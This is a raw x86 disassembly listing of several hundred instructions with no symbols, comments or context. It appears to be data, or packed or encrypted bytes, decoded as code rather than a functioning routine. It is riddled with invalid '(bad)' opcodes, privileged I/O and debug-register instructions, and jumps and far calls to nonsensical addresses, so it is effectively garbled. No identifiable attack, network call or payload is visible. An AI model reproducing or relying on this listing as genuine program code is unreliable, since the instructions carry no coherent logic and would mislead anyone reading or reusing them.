  430403:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  430408:	mov    edi,DWORD PTR [ecx]
  43040a:	test   al,0xcc
  43040c:	dec    ebp
  43040d:	test   BYTE PTR [ebx],dh
  43040f:	pop    es
  430410:	xor    eax,DWORD PTR [eax]
  430412:	add    ecx,DWORD PTR [esi]
  430414:	add    ecx,eax
  430416:	psraw  mm0,mm1
  430419:	sub    BYTE PTR [ebp+0x38],cl
  43041c:	mov    edi,DWORD PTR [ebx]
  43041e:	lock int3 
  430420:	shl    edx,1
  430422:	rol    BYTE PTR [ebp+0xc],1
  430425:	mov    DWORD PTR [ebp-0x24],0xf8038533
  43042c:	jmp    0x770476
  430431:	pushf  
  430432:	inc    ebp
  430433:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  430439:	xor    ecx,ebx
  43043b:	add    ecx,esi
  43043d:	mov    esi,eax
  43043f:	enter  0x45af,0x8b
  430443:	xor    ecx,eax
  430445:	add    edx,DWORD PTR [ebp-0x77]
  430448:	sub    ecx,DWORD PTR [eax]
  43044a:	cmp    eax,DWORD PTR [ebp+0x77]
  43044d:	aad    0x8b
  43044f:	pushf  
  430450:	test   al,0xc7
  430452:	mov    DWORD PTR [eax-0x7747b00],ebp
  430458:	lods   al,BYTE PTR ds:[esi]
  430459:	inc    ebp
  43045a:	dec    ebp
  43045b:	cmp    dh,BYTE PTR [ebx]
  43045d:	pushf  
  43045e:	xor    eax,edi
  430460:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  430467:	inc    ebp
  430468:	dec    ebp
  430469:	cmp    BYTE PTR [ebx-0x2e380f64],cl
  43046f:	mov    esp,0xf80585d0
  430474:	inc    ebp
  430475:	inc    ebp
  430476:	jmp    0x4304b6
  430478:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  43047f:	dec    ebp
  430480:	xor    esi,DWORD PTR [ebx]
  430482:	add    eax,DWORD PTR [ebx]
  430484:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  43048a:	dec    ebp
  43048b:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  430491:	out    dx,eax
  430492:	rol    BYTE PTR [eax],1
  430494:	add    eax,0xebc8458b
  430499:	dec    ebp
  43049a:	mov    ebp,DWORD PTR [ebx]
  43049c:	mov    esp,0x33f84d8b
  4304a1:	ret    
  4304a2:	xor    eax,esi
  4304a4:	add    ecx,eax
  4304a6:	add    eax,DWORD PTR [edx+0xc1010f]
  4304ac:	dec    ebp
  4304ad:	inc    ebp
  4304ae:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4304b4:	ror    bl,1
  4304b6:	add    eax,0xebc645ce
  4304bb:	scas   eax,DWORD PTR es:[edi]
  4304bc:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4304c2:	xor    ebp,DWORD PTR [ebx]
  4304c4:	xor    edi,DWORD PTR [ebx]
  4304c6:	add    esi,DWORD PTR [edi+0x3]
  4304c9:	mov    ecx,DWORD PTR [edi]
  4304cb:	clc    
  4304cc:	rol    ebx,0x4d
  4304cf:	(bad)  
  4304d0:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  4304d7:	mov    ah,0x45
  4304d9:	dec    ebp
  4304da:	jbe    0x43050f
  4304dc:	mov    esi,DWORD PTR [ebx]
  4304de:	call   0x334651e6
  4304e3:	rdpmc  
  4304e5:	rol    DWORD PTR [ebx],0x4d
  4304e8:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  4304ee:	inc    ebp
  4304ef:	ror    BYTE PTR [ebx+0x45450808],1
  4304f5:	jmp    0x10b0585
  4304fa:	inc    ebp
  4304fb:	inc    ebp
  4304fc:	(bad)  
  4304fd:	mov    ebx,eax
  4304ff:	clc    
  430500:	test   ebx,eax
  430502:	clc    
  430503:	retf   
  430504:	inc    ebp
  430505:	into   
  430506:	mov    esi,0x8b85afec
  43050c:	clc    
  43050d:	enter  0x5545,0x3b
  430511:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  430518:	ret    
  430519:	mov    ah,0xc6
  43051b:	addr16 push 0x338b4545
  430521:	clc    
  430522:	add    eax,ebx
  430524:	loopne 0x4304f1
  430526:	dec    ebp
  430527:	into   
  430528:	mov    al,dh
  43052a:	or     BYTE PTR [edi-0x37ff748e],ch
  430530:	inc    ebp
  430531:	push   ebp
  430532:	mov    ebp,DWORD PTR [ebx]
  430534:	in     al,dx
  430535:	cmp    eax,ebx
  430537:	ja     0x43057e
  430539:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  43053f:	inc    ebp
  430540:	call   0xd7c3:0x88f8328b
  430547:	retf   
  430548:	inc    ebp
  430549:	into   
  43054a:	mov    eax,esi
  43054c:	in     al,dx
  43054d:	scas   eax,DWORD PTR es:[edi]
  43054e:	retf   
  43054f:	mov    ecx,DWORD PTR [ebp-0x38]
  430552:	mov    edx,DWORD PTR [ebp-0x24]
  430555:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8866]
  43055c:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  430563:	mov    eax,DWORD PTR [ebx]
  430565:	clc    
  430566:	loopne 0x43052b
  430568:	push   ebp
  430569:	retf   
  43056a:	mov    dh,al
  43056c:	adc    esi,ecx
  43056e:	jb     0x43051f
  430570:	add    BYTE PTR [ebx+0x558bc845],cl
  430576:	in     al,dx
  430577:	sub    eax,ebx
  430579:	cmp    ecx,ebx
  43057b:	mov    eax,esi
  43057d:	mov    esp,0x45af03ce
  430582:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  430588:	mov    eax,ebx
  43058a:	in     al,dx
  43058b:	into   
  43058c:	dec    ebp
  43058d:	(bad)  
  43058e:	xor    ebp,DWORD PTR [edi+0x80f8903]
  430594:	rol    DWORD PTR [ebp+0x4d],0x89
  430598:	xor    esp,esp
  43059a:	sub    eax,DWORD PTR [ebp-0x75]
  43059d:	add    ebp,esp
  43059f:	mov    al,0x55
  4305a1:	inc    ebp
  4305a2:	xor    esi,DWORD PTR ds:0x890f9c03
  4305a8:	retf   0x55dc
  4305ab:	inc    ebp
  4305ac:	xor    esi,DWORD PTR [ebx+ebp*1]
  4305af:	pushf  
  4305b0:	(bad)  
  4305b1:	(bad)  
  4305b2:	adc    eax,eax
  4305b4:	jb     0x43053b
  4305b6:	add    al,bh
  4305b8:	enter  0x8645,0x33
  4305bc:	inc    DWORD PTR [ebx]
  4305be:	(bad)  
  4305bf:	jmp    0x430606
  4305c1:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4305c7:	inc    ebp
  4305c8:	(bad)  
  4305c9:	mov    ebp,DWORD PTR [edi-0x277b7424]
  4305cf:	call   0xb4d:0x88c132cb
  4305d6:	lea    eax,[ebp+0x8]
  4305d9:	xor    esi,DWORD PTR [edx+0x3]
  4305dc:	add    al,ah
  4305de:	inc    ebp
  4305df:	dec    ebp
  4305e0:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4305e6:	data16 add ch,cl
  4305e9:	inc    ebp
  4305ea:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  4305f0:	inc    ebp
  4305f1:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  4305f7:	push   ebp
  4305f8:	(bad)  
  4305f9:	mov    BYTE PTR [edi+0xf723b11],ch
  4305ff:	add    ch,ch
  430601:	inc    ebp
  430602:	dec    DWORD PTR [ebx-0x34332775]
  430608:	add    al,0x4d
  43060a:	inc    ebp
  43060b:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  430611:	call   0xc000:0x8b003201
  430618:	add    BYTE PTR [ebp-0x1],cl
  43061b:	xor    ecx,esp
  43061d:	xor    eax,DWORD PTR [eax]
  43061f:	add    edx,DWORD PTR [eax+0x3]
  430622:	mov    DWORD PTR [edi],ecx
  430624:	call   0x4288c6ea
  430629:	mov    DWORD PTR [ebp-0x20],esp
  43062c:	add    BYTE PTR [ebp+0x7d],al
  43062f:	mov    eax,DWORD PTR [eax]
  430631:	in     al,0x15
  430633:	ret    
  430634:	iret   
  430635:	(bad)  
  430636:	enter  0x14af,0x8b
  43063a:	(bad)  
  43063b:	in     al,dx
  43063c:	or     bl,cl
  43063e:	adc    cl,al
  430640:	push   ebp
  430641:	dec    ebp
  430642:	inc    eax
  430643:	mov    edx,DWORD PTR [ebp-0x20]
  430646:	jb     0x430613
  430648:	mov    ecx,esi
  43064a:	cld    
  43064b:	scas   eax,DWORD PTR es:[edi]
  43064c:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  430653:	mov    BYTE PTR [eax],0x8c
  430656:	push   0xffffff9a
  430658:	push   edi
  430659:	xor    dl,BYTE PTR [eax+0x3b]
  43065c:	mov    ecx,DWORD PTR [edi]
  43065e:	call   0x8c424bc1
  430663:	mov    eax,eax
  430665:	in     al,dx
  430666:	jge    0x4306b5
  430668:	mov    DWORD PTR [ebx],esi
  43066a:	int3   
  43066b:	add    eax,DWORD PTR [ebp+0xf]
  43066e:	xor    eax,ecx
  430670:	(bad)  
  430671:	dec    ebp
  430672:	pushf  
  430673:	xor    ecx,esp
  430675:	add    edi,DWORD PTR [edi]
  430677:	mov    eax,DWORD PTR [ebp-0x38]
  43067a:	aam    0x84
  43067c:	aam    0x9a
  43067e:	add    esi,DWORD PTR [edx]
  430680:	jmp    0x43060b
  430682:	mov    cl,al
  430684:	add    eax,0x14330f45
  430689:	mov    ecx,0xff458d80
  43068e:	jmp    0xc990165b
  430693:	mov    edx,ecx
  430695:	rol    BYTE PTR [ebp+0x330155],1
  43069b:	add    ecx,DWORD PTR [ebp+0xf]
  43069e:	xor    eax,edx
  4306a0:	(bad)  
  4306a1:	ror    DWORD PTR [eax],0x86
  4306a4:	jb     0x4306a3
  4306a6:	add    bh,bh
  4306a8:	clc    
  4306a9:	inc    ebp
  4306aa:	jb     0x430716
  4306ac:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4306b2:	xor    eax,0xc7d89c8b
  4306b7:	add    al,al
  4306b9:	push   0xf830c3
  4306be:	inc    ebp
  4306bf:	jne    0x4306f6
  4306c1:	push   0xffffff9c
  4306c3:	inc    edi
  4306c5:	adc    al,0xe8
  4306c7:	inc    ebp
  4306c8:	test   DWORD PTR [ebp-0x7cba8b08],eax
  4306ce:	mov    ecx,DWORD PTR [eax]
  4306d0:	cld    
  4306d1:	or     DWORD PTR [ebp-0x34],0x33
  4306d5:	jbe    0x4306da
  4306d7:	mov    edx,DWORD PTR [ecx+0x2b]
  4306da:	dec    ebp
  4306db:	mov    cl,BYTE PTR [ebx+0x45d801]
  4306e1:	mov    BYTE PTR [ebx],dh
  4306e3:	mov    eax,DWORD PTR [ebx]
  4306e5:	or     BYTE PTR [ecx+0x3b],dl
  4306e8:	dec    ebp
  4306e9:	int3   
  4306ea:	xor    ebp,edi
  4306ec:	add    eax,DWORD PTR [ebp+0x51]
  4306ef:	mov    ecx,DWORD PTR [ebp-0x28]
  4306f2:	xor    eax,DWORD PTR [eax]
  4306f4:	add    ebp,DWORD PTR [eax+0x51]
  4306f7:	adc    BYTE PTR [eax+0x0],0x8b
  4306fb:	add    BYTE PTR [ebx+0x4d18fcff],cl
  430701:	inc    ebp
  430702:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  430708:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  43070e:	dec    ebp
  43070f:	mov    esi,DWORD PTR [ebx]
  430711:	hlt    
  430712:	add    eax,ebx
  430714:	push   ecx
  430715:	inc    ebp
  430716:	dec    ebp
  430717:	aam    0xff
  430719:	aam    0xe4
  43071b:	(bad)  
  43071c:	retf   
  43071d:	mov    al,ds:0xc1ff39ce
  430722:	adc    al,0xc6
  430724:	inc    ebp
  430725:	and    eax,0x9c0f4c85
  43072a:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  430731:	cmp    BYTE PTR [ebx+0x39],0x0
  430735:	mov    dh,0xc7
  430737:	cmp    eax,eax
  430739:	jne    0x4543ff85
  43073f:	mov    edi,DWORD PTR [ebx]
  430741:	mov    eax,0x848bcb9c
  430746:	rcr    BYTE PTR [edx-0x7c7fcd0f],0x66
  43074d:	or     BYTE PTR [edi],cl
  43074f:	(bad)  
  430750:	dec    ebp
  430751:	inc    edi
  430752:	add    bh,0x53
  430755:	or     cl,ch
  430757:	test   DWORD PTR [eax+0x4d4501f8],ecx
  43075d:	xchg   BYTE PTR [eax-0x1638ac64],al
  430763:	mov    esp,0xf802b588
  430768:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430769:	inc    ebp
  43076a:	(bad)  
  43076b:	cmp    edi,edi
  43076d:	pushf  
  43076e:	or     DWORD PTR [ecx+0x45ffe474],0x0
  430775:	mov    ecx,DWORD PTR [ebp-0x340018]
  43077b:	into   
  43077c:	dec    DWORD PTR [ebx-0x7f72431c]
  430782:	push   0x5000ff01
  430787:	retf   
  430788:	inc    ebp
  430789:	into   
  43078a:	dec    DWORD PTR [ebx-0x343f3ff4]
  430790:	push   eax
  430791:	into   
  430792:	call   0x4b0c22
  430797:	retf   
  430798:	add    dh,cl
  43079a:	add    bh,bh
  43079c:	mov    DWORD PTR [eax+ecx*1],edx
  43079f:	clc    
  4307a0:	inc    ebp
  4307a1:	inc    ebp
  4307a2:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4307a8:	push   0x1
  4307aa:	push   edi
  4307ab:	add    BYTE PTR [eax-0x35],dl
  4307ae:	mov    ecx,esi
  4307b0:	cld    
  4307b1:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4307b7:	into   
  4307b8:	ror    BYTE PTR [ebx+0x75000800],0x50
  4307bf:	xor    eax,DWORD PTR [ebp+0x3]
  4307c2:	jne    0x430815
  4307c4:	call   DWORD PTR [eax-0x3c]
  4307c7:	mov    DWORD PTR [ecx-0x18],edx
  4307ca:	mov    edi,edi
  4307cc:	call   0x8b464d55
  4307d1:	add    ah,ah
  4307d3:	rol    BYTE PTR [ebp-0x7c],0xeb
  4307d7:	add    edi,edi
  4307d9:	add    al,ch
  4307db:	inc    ebp
  4307dc:	push   ecx
  4307dd:	cmp    cl,BYTE PTR [ebx+0x45c7c49c]
  4307e3:	mov    al,0xc7
  4307e5:	test   esp,esp
  4307e7:	clc    
  4307e8:	test   DWORD PTR [ebp-0x8],ecx
  4307eb:	add    BYTE PTR [ebp+0x53],0x34
  4307ef:	jmp    0x8bcc9090
  4307f4:	in     al,dx
  4307f5:	or     BYTE PTR [ebp-0xf],al
  4307f8:	xor    eax,DWORD PTR [eax+0x4f896603]
  4307fe:	hlt    
  4307ff:	mov    eax,DWORD PTR [ebp-0x50]
  430802:	xor    esi,ecx
  430804:	add    eax,DWORD PTR [eax+0x4f086689]
  43080a:	inc    ebp
  43080b:	adc    ebp,0x68
  43080e:	pushf  
  43080f:	inc    edi
  430811:	add    al,ch
  430813:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430814:	test   edi,edi
  430816:	clc    
  430817:	inc    DWORD PTR [ebp-0x73]
  43081a:	cmp    dh,BYTE PTR [esp+ebx*4-0x1]
  43081e:	(bad)  
  43081f:	push   ecx
  430820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430821:	jne    0x4307a8
  430823:	push   eax
  430824:	clc    
  430825:	test   DWORD PTR [ebp-0x1],eax
  430828:	cmp    bh,bh
  43082a:	pushf  
  43082b:	mov    eax,edi
  43082d:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  430834:	inc    ebp
  430835:	push   edi
  430836:	sbb    bl,BYTE PTR ds:[eax+eax*1-0x7f1b9775]
  43083e:	dec    ebp
  43083f:	add    BYTE PTR [ebx],dh
  430841:	inc    ebp
  430842:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  430848:	enter  0x8401,0x0
  43084c:	add    al,BYTE PTR [eax]
  43084e:	add    bh,bh
  430850:	out    dx,eax
  430851:	sbb    BYTE PTR [eax],al
  430853:	dec    ebp
  430854:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  43085a:	sub    esi,DWORD PTR [ebx]
  43085c:	mov    ebp,DWORD PTR [eax-0x8]
  43085f:	add    bl,0x0
  430862:	(bad)  
  430863:	cmp    eax,ecx
  430865:	or     BYTE PTR [edx+0x750114],al
  43086b:	inc    DWORD PTR [ebp+0x18]
  43086e:	mov    eax,DWORD PTR [ebp-0x8]
  430871:	mov    ebx,eax
  430873:	(bad)  
  430874:	retf   
  430875:	inc    ebp
  430876:	into   
  430877:	mov    esi,eax
  430879:	int3   
  43087a:	scas   eax,DWORD PTR es:[edi]
  43087b:	push   es
  43087c:	mov    esi,DWORD PTR [ebp-0xc]
  43087f:	call   DWORD PTR [ebp+0x18]
  430882:	sub    edi,DWORD PTR [ebp+0x3b]
  430885:	mov    esi,DWORD PTR [edi-0x34]
  430888:	mov    eax,DWORD PTR [ebp-0x8]
  43088b:	xor    eax,0xc7c69cc3
  430890:	mov    esp,0x8b8500dc
  430895:	clc    
  430896:	mov    esp,0x338b4d45
  43089b:	in     al,0x33
  43089d:	ret    
  43089e:	add    eax,esi
  4308a0:	add    eax,DWORD PTR [ebp+0xf]
  4308a3:	mov    eax,ecx
  4308a5:	in     al,0x4d
  4308a7:	ret    
  4308a8:	mov    eax,esi
  4308aa:	in     al,dx
  4308ab:	inc    ebp
  4308ac:	rol    edi,1
  4308ae:	sar    al,1
  4308b0:	or     BYTE PTR [ebp+0x45e9f845],al
  4308b6:	add    BYTE PTR [ebx],bh
  4308b8:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  4308bf:	test   ebx,eax
  4308c1:	clc    
  4308c2:	retf   
  4308c3:	inc    ebp
  4308c4:	into   
  4308c5:	cmp    esi,eax
  4308c7:	pushf  
  4308c8:	scas   eax,DWORD PTR es:[edi]
  4308c9:	(bad)  
  4308ca:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  4308d1:	inc    ebp
  4308d2:	cmp    edi,DWORD PTR [edi]
  4308d4:	ja     0x430872
  4308d6:	mov    eax,edi
  4308d8:	mov    esp,0x458567a8
  4308dd:	clc    
  4308de:	mov    eax,DWORD PTR [ebp-0x8]
  4308e1:	mov    eax,ebx
  4308e3:	in     al,dx
  4308e4:	retf   
  4308e5:	ret    
  4308e6:	into   
  4308e7:	mov    dh,0x7d
  4308ea:	scas   eax,DWORD PTR es:[edi]
  4308eb:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  4308f1:	add    BYTE PTR [ebx],ch
  4308f3:	jmp    0xba0a33
  4308f8:	mov    eax,DWORD PTR [ebp-0x5c]
  4308fb:	mov    eax,DWORD PTR [ebp-0x14]
  4308fe:	inc    ebp
  4308ff:	enter  0x458b,0xf8
  430903:	xor    eax,ebx
  430905:	add    ecx,ebx
  430907:	cmp    ecx,esi
  430909:	shufps xmm7,xmm4,0xaf
  43090d:	add    BYTE PTR [ebx+0x55e8f48b],cl
  430913:	dec    ebp
  430914:	sub    esi,DWORD PTR [ebx]
  430916:	cmp    esi,DWORD PTR [ebx]
  430918:	ja     0x43091d
  43091a:	mov    eax,DWORD PTR [ebx]
  43091c:	lods   al,BYTE PTR ds:[esi]
  43091d:	mov    db0,ecx
  430920:	inc    ebp
  430921:	dec    ebp
  430922:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  430928:	retf   
  430929:	rol    dh,1
  43092b:	or     al,0xce
  43092d:	inc    ebp
  43092e:	scas   eax,DWORD PTR es:[edi]
  43092f:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  430935:	add    BYTE PTR [ebx],ch
  430937:	add    BYTE PTR [ebx],bh
  430939:	inc    ebp
  43093a:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  430940:	inc    ebp
  430941:	retf   
  430942:	mov    ecx,esi
  430944:	clc    
  430945:	(bad)  
  430946:	retf   
  430947:	scas   eax,DWORD PTR es:[edi]
  430948:	ret    
  430949:	mov    ecx,esi
  43094b:	hlt    
  43094c:	(bad)  
  43094d:	push   ebp
  43094e:	scas   eax,DWORD PTR es:[edi]
  43094f:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  430955:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  43095b:	add    BYTE PTR [ebx],al
  43095d:	mov    eax,eax
  43095f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430960:	inc    ebp
  430961:	dec    ebp
  430962:	xor    eax,0x89339c33
  430967:	add    edx,eax
  430969:	add    eax,DWORD PTR [ebp+0xf]
  43096c:	xor    al,0xc1
  43096e:	pushf  
  43096f:	dec    ebp
  430970:	(bad)  
  430971:	mov    esi,DWORD PTR [eax-0x72e7a14]
  430977:	rol    BYTE PTR [ebp+0x5],1
  43097a:	xor    eax,DWORD PTR [ebp+0x3]
  43097d:	jmp    0x43096a
  43097f:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430985:	xor    eax,DWORD PTR [ebp+0x33]
  430988:	mov    eax,DWORD PTR [ebx]
  43098a:	rol    BYTE PTR [ebx],1
  43098c:	test   BYTE PTR [edi],cl
  43098e:	call   0xb8b:0x884d32c1
  430995:	in     al,dx
  430996:	inc    ebp
  430997:	shl    DWORD PTR [ebx],1
  430999:	rol    BYTE PTR [ebx],1
  43099b:	add    eax,0xeb4d45e0
  4309a0:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  4309a6:	add    BYTE PTR [ebx],dh
  4309a8:	inc    ebp
  4309a9:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  4309af:	rdpmc  
  4309b1:	rol    DWORD PTR [ebx],0x4d
  4309b4:	loopne 0x430941
  4309b6:	push   ebp
  4309b7:	in     al,dx
  4309b8:	mov    cl,dl
  4309ba:	adc    eax,edx
  4309bc:	jb     0x4309c3
  4309be:	add    BYTE PTR [ebp+0x45],al
  4309c1:	jmp    0x43094e
  4309c3:	mov    ebx,eax
  4309c5:	test   al,0xcb
  4309c7:	dec    ebp
  4309c8:	dec    ebp
  4309c9:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  4309cf:	add    ebx,DWORD PTR [edx-0x743ecdf1]
  4309d5:	dec    ebp
  4309d6:	mov    al,0x8b
  4309d8:	dec    ebp
  4309d9:	in     al,dx
  4309da:	xor    edx,ecx
  4309dc:	xor    edx,eax
  4309de:	add    eax,DWORD PTR [ebp+0x3]
  4309e1:	jbe    0x4309f2
  4309e3:	mov    eax,ecx
  4309e5:	test   al,0x45
  4309e7:	dec    ebp
  4309e8:	mov    DWORD PTR [ebx],esi
  4309ea:	loopne 0x430a1f
  4309ec:	inc    ebp
  4309ed:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  4309f3:	rol    esi,0x45
  4309f6:	scas   eax,DWORD PTR es:[edi]
  4309f7:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  4309fd:	mov    eax,ecx
  4309ff:	hlt    
  430a00:	dec    ebp
  430a01:	inc    ebp
  430a02:	mov    eax,edi
  430a04:	loopne 0x4309de
  430a06:	retf   
  430a07:	test   esi,ecx
  430a09:	clc    
  430a0a:	scas   eax,DWORD PTR es:[edi]
  430a0b:	inc    ebp
  430a0c:	mov    eax,edi
  430a0e:	fdiv   st,st(0)
  430a10:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430a16:	call   0xf8b:0x3b9c323b
  430a1d:	fcomp  DWORD PTR [esi-0x3d]
  430a20:	inc    esi
  430a22:	mov    ebp,DWORD PTR [eax-0x10]
  430a25:	inc    ebp
  430a26:	dec    ebp
  430a27:	xor    esi,DWORD PTR [ebx]
  430a29:	add    eax,DWORD PTR [ebx]
  430a2b:	loopne 0x430a3c
  430a2d:	dec    ebp
  430a2e:	ror    DWORD PTR [edx+0x7233084d],0x3
  430a35:	add    BYTE PTR [ebx-0x7b740bbb],cl
  430a3b:	lock call 0xf48b:0x894532c3
  430a43:	rol    BYTE PTR [ebp-0x7c],1
  430a46:	xor    ebx,DWORD PTR [edx-0x7772cd47]
  430a4c:	call   edi
  430a4e:	enter  0x4d45,0x8b
  430a52:	mov    esi,eax
  430a54:	fmul   st(3),st
  430a56:	push   ebp
  430a57:	dec    ebp
  430a58:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430a5e:	ret    0xc19a
  430a61:	xor    al,BYTE PTR [esi-0x280276]
  430a67:	dec    ebp
  430a68:	jne    0x430a9d
  430a6a:	mov    eax,DWORD PTR [ebx]
  430a6c:	cld    
  430a6d:	loopne 0x430a1f
  430a6f:	push   ebp
  430a70:	add    DWORD PTR [eax+0x72851100],ecx
  430a76:	inc    DWORD PTR [eax]
  430a78:	inc    DWORD PTR [ebp-0x75]
  430a7b:	mov    edi,esp
  430a7d:	lock add bl,0x1
  430a81:	retf   
  430a82:	add    dh,al
  430a84:	xor    dh,cl
  430a86:	inc    ebp
  430a87:	scas   eax,DWORD PTR es:[edi]
  430a88:	mov    eax,DWORD PTR [ebx]
  430a8a:	shl    al,0x0
  430a8d:	inc    ebp
  430a8e:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430a94:	call   0x461ccc
  430a99:	ud0    eax,ecx
  430a9c:	adc    al,0x4d
  430a9e:	inc    ebp
  430a9f:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430aa5:	lock push 0x338055
  430aab:	add    eax,DWORD PTR [eax]
  430aad:	ud0    ecx,edx
  430ab0:	sbb    BYTE PTR [ebp+0x5e],dl
  430ab3:	xor    ecx,ecx
  430ab5:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430abc:	push   ecx
  430abd:	add    BYTE PTR [ebp-0x38],cl
  430ac0:	mov    DWORD PTR [esi-0x740004],eax
  430ac6:	cld    
  430ac7:	inc    ebp
  430ac8:	xchg   ebx,eax
  430ac9:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  430acf:	xabort 0xaf
  430ad2:	icebp  
  430ad3:	mov    esi,DWORD PTR [ebp-0x28]
  430ad6:	(bad)  
  430ad7:	retf   
  430ad8:	or     ecx,eax
  430ada:	(bad)  
  430adb:	dec    ebp
  430adc:	pop    es
  430add:	(bad)  
  430ade:	(bad)  
  430adf:	or     BYTE PTR [esi],al
  430ae1:	jb     0x430aa9
  430ae3:	add    BYTE PTR [ebx],al
  430ae5:	inc    ebp
  430ae6:	(bad)  
  430ae7:	mov    ecx,DWORD PTR [edx]
  430ae9:	fadd   st(6),st
  430aeb:	ret    
  430aec:	add    ah,BYTE PTR [esi-0x37]
  430aef:	int    0x55
  430af1:	sub    ebp,esp
  430af3:	add    edx,DWORD PTR [ecx-0x14]
  430af6:	inc    ebp
  430af7:	inc    ebp
  430af8:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430afe:	cld    
  430aff:	(bad)  
  430b00:	(bad)  
  430b01:	scas   eax,DWORD PTR es:[edi]
  430b02:	loopne 0x430b3f
  430b04:	mov    DWORD PTR [edi],ecx
  430b06:	mov    ebp,ebp
  430b08:	clc    
  430b09:	push   eax
  430b0b:	push   DWORD PTR [ebp-0x4]
  430b0e:	mov    BYTE PTR [ebp+0xa],0xff
  430b12:	(bad)  
  430b13:	int3   
  430b14:	or     BYTE PTR [eax],al
  430b16:	(bad)  
  430b17:	lea    eax,[edi]
  430b19:	ins    BYTE PTR es:[edi],dx
  430b1a:	(bad)  
  430b1b:	inc    DWORD PTR [ecx]
  430b1d:	push   eax
  430b1e:	mov    BYTE PTR [ebp+0x9],0x8b
  430b22:	leave  
  430b23:	les    edx,FWORD PTR [ebp+0x0]
  430b26:	in     al,dx
  430b27:	call   DWORD PTR [ecx-0x75]
  430b2a:	inc    ebp
  430b2b:	cld    
  430b2c:	mov    DWORD PTR [eax+0x8b01fc],eax
  430b32:	cld    
  430b33:	xor    BYTE PTR [esi-0x76a8f98b],bh
  430b39:	sti    
  430b3a:	mov    eax,DWORD PTR [eax]
  430b3c:	clc    
  430b3d:	test   eax,esi
  430b3f:	je     0x430bb6
  430b41:	mov    eax,esi
  430b43:	cld    
  430b44:	add    al,0x80
  430b46:	add    WORD PTR [ecx+0x0],ax
  430b4a:	fadd   DWORD PTR [eax]
  430b4c:	mov    BYTE PTR [eax],0xd4
  430b4f:	push   0xffffffc3
  430b51:	push   edi
  430b52:	mov    edx,DWORD PTR [eax+0x51]
  430b55:	pop    edi
  430b56:	lea    ebx,[ebx-0x8]
  430b59:	ret    0x45
  430b5c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430b62:	xchg   eax,edi
  430b64:	mov    DWORD PTR [ebp-0x75],ecx
  430b67:	push   esi
  430b68:	clc    
  430b69:	jne    0x430b3b
  430b6b:	mov    ecx,0xf8450b0b
  430b70:	(bad)  
  430b71:	push   cs
  430b72:	or     BYTE PTR [ebp-0x3a],dh
  430b75:	cmp    eax,DWORD PTR [ecx]
  430b77:	pop    esi
  430b78:	(bad)  
  430b79:	or     al,0x5
  430b7b:	inc    eax
  430b7c:	leave  
  430b7d:	call   0x21994d86
  430b82:	iret   
  430b83:	inc    eax
  430b84:	leave  
  430b85:	jmp    0xd8ce4c89
  430b8a:	mov    eax,DWORD PTR [edx-0x3a]
  430b8d:	jl     0x430b83
  430b8f:	inc    eax
  430b90:	nop
  430b91:	loop   0x430b92
  430b93:	ret    
  430b94:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430b9a:	add    eax,0xff45e8f8
  430b9f:	push   esi
  430ba0:	push   DWORD PTR [ebp-0x39]
  430ba3:	mov    eax,0x7e9da46
  430ba8:	or     al,0x6
  430baa:	push   DWORD PTR [ebp-0x3a]
  430bad:	cmp    eax,DWORD PTR [edx]
  430baf:	pop    esi
  430bb0:	ret    
  430bb1:	or     al,0x56
  430bb3:	inc    ecx
  430bb4:	push   ebp
  430bb5:	jl     0x430ba3
  430bb7:	inc    edx
